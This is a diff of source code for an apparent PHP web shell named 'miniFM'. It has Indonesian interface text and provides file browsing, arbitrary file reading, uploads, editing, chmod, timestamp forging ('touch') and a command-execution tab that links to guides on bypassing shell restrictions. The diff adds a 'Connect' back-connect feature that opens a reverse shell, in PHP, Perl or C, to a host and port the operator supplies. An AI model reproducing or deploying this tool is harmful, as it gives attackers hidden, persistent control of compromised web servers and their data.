+			$outs = 'gak bisa di konekin!';
+		}
+		echo $outs;
 		die();
 	} else if($_GET['act'] == 'unzip'){
 		if(class_exists('ZipArchive')){
@@ -797,7 +831,7 @@ if(!isset($_SESSION['auth'])){
 		<link rel="shortcut icon" href="<?php echo fType('logo');?>"/>
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css" integrity="sha512-rt/SrQ4UNIaGfDyEXZtNcyWvQeOq0QLygHluFQcSjaGB04IxWhal71tKuzP6K8eYXYB6vJV4pHkXcmFGGQ1/0w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 		<title><?php echo $stitle;?></title>
-		<style>@import url(https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap);:root{--cyan:#2be2ff;--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0,212,51;--bs-danger-rgb:220,53,69}::-webkit-scrollbar-track{border-radius:6px;background-color:#2b2f34}::-webkit-scrollbar{width:6px;height:4px}::-webkit-scrollbar-thumb{border-radius:6px;-webkit-box-shadow:inset 0 0 4px #000;background-color:var(--bg-icon)}body,html,pre{font-family:"Ubuntu Mono",monospace}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}body{font-size:1em;padding-top:5.25rem;color:#ddd}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input{font-size:1em!important}nav .nav-tabs{border-bottom:1px solid #2be2ff}nav .nav-tabs .nav-link.active{background:#00a6c0;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #2be2ff}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(var(--bs-success-rgb),5%)}table thead th{background:rgb(var(--bs-success-rgb),20%);border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:.3s}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.breadcrumb{background:linear-gradient(177deg,rgb(var(--bs-success-rgb),20%),transparent);padding:2px 10px}.breadcrumb-item a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}pre,textarea.form-control{font-size:1em;border:0!important;color:#cfdce8!important}.form-control-sm{height:auto}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .7em 0 .25em}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),10%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"multiple";color:var(--success);background:#2b2f34}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important}.text-cyan{color:var(--cyan)!important;color:#eee}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}</style>
+		<style>@import url(https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap);:root{--cyan:#2be2ff;--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0,212,51;--bs-danger-rgb:220,53,69}::-webkit-scrollbar-track{border-radius:6px;background-color:#2b2f34}::-webkit-scrollbar{width:6px;height:4px}::-webkit-scrollbar-thumb{border-radius:6px;-webkit-box-shadow:inset 0 0 4px #000;background-color:var(--bg-icon)}body,html,pre{font-family:"Ubuntu Mono",monospace}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}body{font-size:1em;padding-top:5.25rem;color:#ddd}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input,select{font-size:1em!important}nav .nav-tabs{border-bottom:1px solid #2be2ff}nav .nav-tabs .nav-link.active{background:#00a6c0;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #2be2ff}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(var(--bs-success-rgb),5%)}table thead th{background:rgb(var(--bs-success-rgb),20%);border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:.3s}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.breadcrumb{background:linear-gradient(170deg,rgb(var(--bs-success-rgb),20%),transparent);padding:4px 10px}.breadcrumb-item a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}pre,textarea.form-control{font-size:1em;border:0!important;color:#cfdce8!important}.form-control-sm{height:auto}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .7em 0 .25em}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),10%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}select{background-color:#343a40!important;color:#cfdce8!important}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"multiple";color:var(--success);background:#2b2f34}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important}.text-cyan{color:var(--cyan)!important;color:#eee}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}</style>
 	</head>
 	<body>
 		<header class="header bg-dark fixed-top mt-auto py-md-3 py-2">
@@ -815,6 +849,10 @@ if(!isset($_SESSION['auth'])){
 					<button class="nav-link" data-toggle="tab" data-target="#nav-cmd" type="button" role="tab" aria-controls="nav-cmd" aria-selected="false">
 						<span class="d-block d-sm-none"><?php echo fType('cmd','1em');?></span>
 						<span class="d-none d-sm-block">Command</span>
+					</button>
+					<button class="nav-link" data-toggle="tab" data-target="#nav-bc" type="button" role="tab" aria-controls="nav-bc" aria-selected="false">
+						<span class="d-block d-sm-none"><?php echo fType('bc','1.2em');?></span>
+						<span class="d-none d-sm-block">Connect</span>
 					</button>
 					<button class="nav-link" data-toggle="tab" data-target="#nav-info" type="button" role="tab" aria-controls="nav-info" aria-selected="false">
 						<span class="d-block d-sm-none"><?php echo fType('info','1.2em');?></span>
@@ -834,49 +872,45 @@ if(!isset($_SESSION['auth'])){
 					}
 					echo "<div class='col-12 mt-n2 mb-2 text-success'><small>Drives: ".$drives."</small></div>";
 				}?>
-				<div class="col-sm-12 col-md-4">
-					<form method="post" action="?act=readfile" class="mb-3" id="rqreadfile">
-						<div class="input-group">
-							<div class="input-group-prepend">
-								<label class="input-group-text">ReadFile</label>
-							</div>
-							<input type="text" name="xpath" class="form-control form-control-sm border-success"></input>
-							<div class="input-group-append">
-								<button class="btn btn-outline-success" type="submit">Go</button>
-							</div>
-						</div>
-					</form>
-				</div>
-				<div class="col-sm-6 col-md-4">
-					<form method="post" action="?act=mkdir" class="mb-3" id="rqmkdir">
-						<input type="hidden" name="xpath" value=""/>
-						<div class="input-group">
-							<select class="custom-select border-success" name="xtype" style="max-width:110px;">
-								<option value="dir" selected>New dir</option>
-								<option value="file">New file</option>
-							</select>
-							<input type="text" name="xdir" class="form-control form-control-sm border-success" max-length="50"></input>
-							<div class="input-group-append">
-								<button class="btn btn-outline-success" type="submit">Go</button>
-							</div>
-						</div>
-					</form>
-				</div>
-				<div class="col-sm-6 col-md-4">
-					<form method="post" action="?act=upload" class="mb-3" id="rqupload">
-						<input type="hidden" name="xpath" value=""/>
-						<div class="input-group">
-							<div class="custom-file">
-								<label class="custom-file-label" for="titupl">Upload file</label>
-								<input type="file" name="xfile[]" class="custom-file-input border-success" id="titupl" aria-describedby="upld" multiple></input>
-							</div>
-						</div>
-					</form>
-				</div>
 			</div>
 			<div class="tab-content mt-3" id="nav-tabContent">
 				<div class="tab-pane show active fade" id="nav-berkas" role="tabpanel">
-					<div class="row">
+					<div class="form-row">
+						<div class="col-sm-6 col-md-6 col-lg-4">
+							<form method="post" action="?act=mkdir" class="mb-3" id="rqmkdir">
+								<input type="hidden" name="xpath" value=""/>
+								<div class="input-group">
+									<select class="custom-select border-success" name="xtype" style="max-width:110px;">
+										<option value="dir" selected>New dir</option>
+										<option value="file">New file</option>
+									</select>
+									<input type="text" name="xdir" class="form-control form-control-sm border-success" max-length="50"></input>
+									<div class="input-group-append"><button class="btn btn-outline-success" type="submit">Go</button></div>
+								</div>
+							</form>
+						</div>
+						<div class="col-sm-6 col-md-6 col-lg-4">
+							<form method="post" action="?act=upload" class="mb-3" id="rqupload">
+								<input type="hidden" name="xpath" value=""/>
+								<div class="input-group">
+									<div class="custom-file">
+										<label class="custom-file-label" for="titupl">Upload file</label>
+										<input type="file" name="xfile[]" class="custom-file-input border-success" id="titupl" aria-describedby="upld" multiple></input>
+									</div>
+								</div>
+							</form>
+						</div>
+						<div class="col-sm-12 col-md-12 col-lg-4">
+							<form method="post" action="?act=readfile" class="mb-3" id="rqreadfile">
+								<div class="input-group">
+									<div class="input-group-prepend">
+										<label class="input-group-text">ReadFile</label>
+									</div>
+									<input type="text" name="xpath" class="form-control form-control-sm border-success"></input>
+									<div class="input-group-append"><button class="btn btn-outline-success" type="submit">Go</button></div>
+								</div>
+							</form>
+						</div>
 						<div class='col-12 mb-3' id="fileman"></div>
 					</div>
 				</div>
@@ -888,14 +922,12 @@ if(!isset($_SESSION['auth'])){
 								<span>Command execute</span>
 								<div class="input-group mt-2">
 									<input type="text" class="form-control form-control-sm border-success" name="cmd" placeholder="uname -a"></input>
-									<div class="input-group-append">
-										<button class="btn btn-sm btn-outline-success" type="submit">Go</button>
-									</div>
+									<div class="input-group-append"><button class="btn btn-sm btn-outline-success" type="submit">Go</button></div>
 								</div>
 							</form>
 						</div>
 						<div class="col-12" id="hasilcommand"></div>
-						<div class="col-12 mb-3">
+						<div class="col-12">
 							<span>Bypass Assistance:</span>
 							<ul class="ml-n4">
 								<li><a href="https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions" target="_blank" class="text-cyan">Linux Restrictions</a></li>
@@ -904,6 +936,36 @@ if(!isset($_SESSION['auth'])){
 							</ul>
 						</div>
 					</div>
+				</div>
+				<div class="tab-pane fade" id="nav-bc" role="tabpanel">
+					<form method="post" action="?act=bc" id="rqbc">
+						<input type="hidden" name="xpath" value=""/>
+						<div class="form-row">
+							<div class="col-sm-12 col-md-12 col-lg-4 mb-3">
+								<div class="input-group">
+									<div class="input-group-prepend"><label class="input-group-text">Server</label></div>
+									<input type="text" name="bhost" class="form-control form-control-sm border-success" placeholder="127.0.0.1"></input>
+								</div>
+							</div>
+							<div class="col-sm-12 col-md-6 col-lg-4 mb-3">
+								<div class="input-group">
+									<div class="input-group-prepend"><label class="input-group-text">Port</label></div>
+									<input type="text" name="bport" class="form-control form-control-sm border-success" placeholder="1337"></input>
+								</div>
+							</div>
+							<div class="col-sm-12 col-md-6 col-lg-4 mb-3">
+								<div class="input-group">
+									<div class="input-group-prepend"><label class="input-group-text">Using</label></div>
+									<select class="form-control form-control-sm border-success" name="btype">
+										<option value="1">PHP</option>
+										<option value="2">Perl</option>
+										<option value="3">C</option>
+									</select>
+									<div class="input-group-append"><button class="btn btn-outline-success" type="submit">Go</button></div>
+								</div>
+							</div>
+						</div>
+					</form>
 				</div>
 				<div class="tab-pane fade" id="nav-info" role="tabpanel">
 					<div class="row">
@@ -962,14 +1024,13 @@ if(!isset($_SESSION['auth'])){
 		<footer class="footer bg-dark mt-auto py-md-3 py-2">
 			<div class="container">
 				<blockquote class="blockquote text-center mb-0">
-					<p class="text-light mb-0">miniFM v.3.0</p>
-					<footer class="blockquote-footer">By.<cite>Z190T</cite></footer>
+					<span class="text-secondary small"><?php echo $sfooter;?></span>
 				</blockquote>
 			</div>
 		</footer>
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha512-3gJwYpMe3QewGELv8k/BX9vcqhryRdzRMxVfq6ngyWXwo03GFEzjsUm8Q7RZcHPHksttq7/GFoxjCVUjkjvPdw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.bundle.min.js" integrity="sha512-igl8WEUuas9k5dtnhKqyyld6TzzRjvMqLC79jkgT3z02FvJyHAuUtyemm/P/jYSne1xwFI06ezQxEwweaiV7VA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-		<script>!function(t){var e='<div class="mb-3 bg-transparent"><?php echo fType('loader','1.5em');?> Tunggu bentar...</div>';let a={bs64ToBit:function(t){let e=atob(t);return Uint8Array.from(e,t=>t.codePointAt(0))},btTobs64:function(t){let e=String.fromCodePoint(...t);return btoa(e)},isWellFormed:function(t){if(void 0!==t)return t.isWellFormed();try{return encodeURIComponent(t),!0}catch(e){return!1}},encode:function(t){return a.isWellFormed(t)?a.btTobs64(new TextEncoder().encode(t)):""},decode:function(t){return a.isWellFormed(t)?new TextDecoder().decode(a.bs64ToBit(t)):""}},n=(e,a)=>{t("#shownotif").html('<div id="liveToast" class="toast hide" role="alert" aria-live="assertive" aria-atomic="true" data-delay="10000"><div class="toast-header"><img src="<?php echo fType('logo');?>" width="20" class="rounded mr-2" alt="icon"/><strong class="mr-auto">'+e+'</strong><button type="button" class="ml-2 mb-1 close" data-dismiss="toast" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="toast-body text-secondary">'+a+"</div></div>"),t(".toast").toast("show")};function o(a,o,i,r){var d=t("#modalshowaksi").find(".modal-body");t.ajax({type:"get",url:"?act=path&dir="+o+"&entry="+i+"&opt="+a,beforeSend:function(){d.html(e)}}).done(function(t){d.html(""),r(t)}).fail(function(t,e,a){n("Error",t.status),d.html("error_code: "+t.status)})}function i(e){for(var a=0;a<e.length;a++)e[a].addEventListener("change",function(e){var a=t("option:selected",this)[0],i=a.value,r=t("#modalshowaksi"),d="",l="",s="",m=a.attributes["data-xtype"],f=a.attributes["data-xname"],u=a.attributes["data-xpath"],c=e.currentTarget;if(i.length>0){switch(r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),i){case"rename":l="Rename "+m.value.toUpperCase()+" /"+f.value,d='<form method="post" action="?act=rename" id="rqrename"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><div class="form-group row mb-0"><label for="xname" class="col-sm-2 col-form-label">'+("dir"==m.value?"Directory":"File")+'</label><div class="col-sm-10"><div class="input-group mb-3"><input type="text" class="form-control border-success" id="xname" name="xname" value="'+f.value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',s="";break;case"touch":l="Touch "+m.value.toUpperCase()+" /"+f.value,d='<form method="post" action="?act=touch" id="rqtouch"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><input type="hidden" name="xname" value="'+f.value+'"/><div class="form-group row"><label for="xtime" class="col-sm-2 col-form-label">Datetime</label><div class="col-sm-10"><div class="input-group"><input type="text" class="form-control border-success" id="xtime" name="xtime" value="'+a.attributes["data-xtime"].value+'" autofocus/><div class="input-group-append"><button class="btn btn-success" type="submit">GO</button></div></div></div></div></form>',s=""}"download"==i?window.open("?act=path&dir="+u.value+"&entry="+f.value+"&opt="+i,"_blank"):"del"==i||"zip"==i||"unzip"==i?(r.modal("show"),r.find(".modal-title").html(i+" /"+f.value),r.find(".modal-body").html('<form method="post" action="?act='+i+'" id="rq'+i+'" class="text-center"><input type="hidden" name="xtype" value="'+m.value+'"/><input type="hidden" name="xname" value="'+f.value+'"/><input type="hidden" name="xpath" value="'+u.value+'"/><div class="alert alert-info m-n3 rounded-0">Klik proses utk melanjutkan!!</div>'),r.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success" type="submit">Proses!</button></form>'),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").html("null"),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),c.value=""})):"edit"==i?(r.modal("show"),r.find(".modal-body").addClass("p-0"),r.find(".modal-title").html("Edit "+m.value.toUpperCase()+": /"+f.value),o("view",u.value,f.value,function(t){var e='<form method="post" action="?act=path&dir='+u.value+"&entry="+f.value+'&opt=edit" id="rqeditfile"><textarea name="xdata" class="form-control rounded-0" style="white-space:pre;background:#2b2f34;" rows="30">'+t+"</textarea>";r.find(".modal-body").html(e),r.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button class="btn btn-success text-center" type="submit">Simpan</button></form>'),setTimeout(()=>r.find(".modal-body textarea").focus(),300)}),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").removeClass("p-0").html("null"),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),c.value=""})):"view"==i?(r.modal("show"),r.find(".modal-title").html("View "+m.value.toUpperCase()+": /"+f.value),o("view",u.value,f.value,function(t){r.find(".modal-body").attr("style","background:#2b2f34;").addClass("rounded-0").html('<pre class="mb-0">'+t+"</pre>"),r.find(".modal-footer").removeClass("d-none").addClass("d-flex justify-content-center").html('<button type="button" class="btn btn-danger text-center" data-dismiss="modal" aria-label="Close">Tutup</button>')}),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").attr("style","").removeClass("rounded-0").html("null"),r.find(".modal-footer").addClass("d-none").removeClass("d-flex justify-content-center"),c.value=""})):(r.modal("show"),r.find(".modal-title").html(l),r.find(".modal-body").html(d),r.on("hidden.bs.modal",function(t){r.find(".modal-title").html("unknown"),r.find(".modal-body").html("null"),c.value=""}))}else n("Error","Invalid request!")},!1)}function r(o,i){t.ajax({type:"get",url:"?act=path&dir="+o,timeout:5e3,beforeSend:function(){t("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()}}).done(function(e,n,r){t("#fileman").html(a.decode(e)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),i(e)}).fail(function(e,a,i){t("#fileman").html(a+", response code: "+e.status),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide(),t("form#rqcmd").find('input[name="xpath"]').val(o),t("button#fmanager").attr("data-tempdir",o),n("Error",a+", response code: "+e.status)})}t(document).on("click","a#chdrive",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-path");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd").find('input[name="xpath"]').val(o)}}).done(function(){i(document.querySelectorAll("#showaksi")),t("form#rqcmd").find('input[name="xpath"]').val(o),t("form#rqcmd").parent().find("#hasilcommand").html("")})}),t(document).on("click","a#chdir",function(e){e.preventDefault();var a=t(e.currentTarget).attr("data-path");t("ol.breadcrumb").addClass("pl-0").css({background:"transparent",padding:"0"}).html('<li class="breadcrumb-item w-100 active">					<form method="post" action="?act=changedir" class="mb-0" id="rqchdir">						<div class="input-group">							<input type="text" name="xpath" class="form-control form-control-sm border-success" value="'+a+'" autofocus></input>							<div class="input-group-append">								<button class="btn btn-success" type="submit">Go</button>							</div>						</div>					</form></li>')}),t("button#fmanager").on("click",function(n){n.preventDefault();var o=t(n.currentTarget).attr("data-tempdir");t.ajax({type:"get",url:"?act=path&dir="+o,beforeSend:function(){t("body").find("#fileman").html(e),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").hide()},success:function(e){t("body").find("#fileman").html(a.decode(e)),t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").show().find('input[name="xpath"]').val(o),t("form#rqcmd").find('input[name="xpath"]').val(o)}}).done(function(){i(document.querySelectorAll("#showaksi")),t("form#rqcmd").find('input[name="xpath"]').val(o),t("form#rqcmd").parents().find("#hasilcommand").html("")})}),t("button#fmanager").trigger("click"),t('button[data-target="#nav-cmd"]').on("shown.bs.tab",function(e){t("#hasilcommand").hide()}),t('button[data-target="#nav-berkas"]').on("shown.bs.tab",function(e){t("#fberkas").show()}),t('button[data-target="#nav-berkas"]').on("hidden.bs.tab",function(e){t("#fberkas").hide()}),t('button[data-target="#nav-info"]').on("hidden.bs.tab",function(e){t("#nav-info").find("#showinfo").html("")}),t('button[data-target="#nav-info"]').on("shown.bs.tab",function(a){t.ajax({type:"get",url:"?act=info",dataType:"json",beforeSend:function(){t("#nav-info").find("#showinfo").html(e)}}).done(function(e){try{var a=JSON.parse(JSON.stringify(e)),n=t.map(a,function(t,e){return[t]});t("#nav-info").find("#showinfo").html('<blockquote class="blockquote px-3 pt-n3 pb-3 bg-success-rgb rounded">'+n.join("")+"</blockquote>")}catch(o){t("#nav-info").find("#showinfo").html("Error: Gagal menganalisa server!")}})}),t("#fileman").length>0&&(t("#fileman").on("click","a#ffmanager, button#ffmanager",function(e){e.stopPropagation(),r(t(this).attr("data-path"),function(){i(document.querySelectorAll("#showaksi"))})}),t("#fileman").on("click","a#fxmanager",function(e){e.stopPropagation(),r(t(this).attr("data-path"),function(){i(document.querySelectorAll("#showaksi"))})})),t("#showchmod").on("show.bs.modal",function(e){var a=t(e.relatedTarget),n=t(this).find(".modal-body"),o=a.attr("data-xtype"),i=a.attr("data-xname"),r=a.attr("data-xpath"),d=a.attr("data-xperm");n.find('input[name="xtype"]').val(o),n.find('input[name="xname"]').val(i),n.find('input[name="xpath"]').val(r),n.find('input[name="xperm"]').val(d).focus(),n.find('input[id="xname"]').val(i),n.find('label[for="xname"]').css("text-transform","capitalize").html("dir"==o?"Directory":"File")}),t.each(["rqdel","rqzip","rqunzip","rqrename","rqtouch","rqchmod","rqreadfile","rqeditfile","rqnewfile"],function(o,i){t(document).on("submit","form#"+i,function(o){o.preventDefault();var r=t(this),d=t("#modalshowaksi");if(r.find('button[type="submit"]').prop("disabled",!0),"rqrename"==i||"rqtouch"==i)r.find('input[readonly="readonly"]').prop("readonly",!1);else if("rqeditfile"==i||"rqnewfile"==i)var l=a.encode(r.find('textarea[name="xdata"]').val());else if("rqreadfile"==i){var s=r.find('input[name="xpath"]').val();s.length<1?n("Opss!","Isi dulu nama filenya pak!"):(d.modal("show"),d.find(".modal-title").html("View FILE: "+s))}t.ajax({type:"post",url:r.attr("action"),data:"rqeditfile"==i||"rqnewfile"==i?{xdata:l}:r.serialize(),beforeSend:function(){t(e).insertAfter(r)}}).done(function(e){if(r.next("span").remove(),r.find('button[type="submit"]').prop("disabled",!1),"rqreadfile"==i)d.find(".modal-body").attr("style","background:#dfdfdf;").html('<code><pre class="pre-scrollable mb-0">'+e+"</pre></code>");else{"rqrename"==i||"rqtouch"==i?r.find('input[readonly="readonly"]').prop("readonly",!0):"rqchmod"==i&&t("body").find("#showchmod").modal("hide"),d.modal("hide"),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()})}})})}),t(document).on("submit","form#rqchdir",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xpath"]').val();o.length<1?n("Opss!","Isi dulu nama direktorinya pak!"):(a.find('button[type="submit"]').prop("disabled",!0),r(o,function(){var t=document.querySelectorAll("#showaksi");t.length>0?i(t):n("Error","Direktori tidak ada/ tidak berisi file apapun!")}),a.find('button[type="submit"]').prop("disabled",!1))}),t(document).on("submit","form#rqmkdir",function(a){a.preventDefault();var o=t(this),i=o.find('input[name="xdir"]').val();if(i.length<1)n("Error","Isi dulu nama direktorinya pak!");else if("file"==o.find(":selected").val()){var r=t("#modalshowaksi"),d=o.find('input[name="xpath"]').val();r.modal("show"),r.find(".modal-title").text("FileName: "+i),r.find(".modal-body").html('<form method="post" action="?act=path&dir='+d+"&entry="+i+'&opt=newfile" id="rqnewfile"><div class="d-block mb-3"><textarea name="xdata" class="form-control" style="white-space:pre;" rows="20" placeholder="tulis seperlunya..." autofocus></textarea></div><center><button class="btn btn-success text-center" type="submit">Simpan</button></center></form>')}else o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),beforeSend:function(){t(e).insertAfter(o)},success:function(e){o.next("span").remove(),o.find('button[type="submit"]').prop("disabled",!1),n("Alert",e);var a=t("#fileman").find("a#ffmanager");a[a.length-1].click(function(t){t.stopPropagation()}),o.next("span#notify").fadeTo(3e3,500).slideUp(500,function(){t(this).slideUp(500)})}})}),t('input[type="file"]').on("change",function(){t("form#rqupload").submit()}),t(document).on("submit","form#rqupload",function(e){e.preventDefault();var a=t(this),o=a.find('input[name="xfile[]"]').prop("files");if(o&&o.length<=0||o.size<1)n("Error","File kosong, gak ada isinya!");else{var i=new FormData(this);a.find('button[type="submit"]').prop("disabled",!0),i.append("xfile",o),t.ajax({type:"post",url:a.attr("action"),data:i,dataType:"text",contentType:!1,processData:!1,beforeSend:function(){a.next("span").remove()},success:function(e){a[0].reset(),a.next("span").remove(),a.find('button[type="submit"]').prop("disabled",!1),n("Alert",e);var o=t("#fileman").find("a#ffmanager");o[o.length-1].click(function(t){t.stopPropagation()})}})}}),t(document).on("submit","form#rqcmd",function(n){n.preventDefault();var o=t(this);o.parents().find("#hasilcommand").show(),o.find('button[type="submit"]').prop("disabled",!0),t.ajax({type:"post",url:o.attr("action"),data:o.serialize(),dataType:"json",beforeSend:function(){o.parents().find("#hasilcommand").html(e)},success:function(t){var e=JSON.parse(JSON.stringify(t));o.find('input[name="xpath"]').val(a.decode(e.path)),o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+a.decode(e.stdout)+"</div></div>")},error:function(t,e,a){o.find('button[type="submit"]').prop("disabled",!1),o.parents().find("#hasilcommand").html('<div class="card mb-3"><div class="card-body p-2 font-weight-light">'+e+": "+a+"</div></div>")}}).done(function(e){var n=JSON.parse(JSON.stringify(e));t("form#rqupload,form#rqmkdir,form#rqchdir,form#rqreadfile").find('input[name="xpath"]').val(a.decode(n.path)),t.each(t("button[data-tempdir]"),function(e,o){t(o).attr("data-tempdir",a.decode(n.path))}),t.each(t("a#fxmanager"),function(e,o){t(o).attr("data-path",a.decode(n.path))})})})}(jQuery);</script>
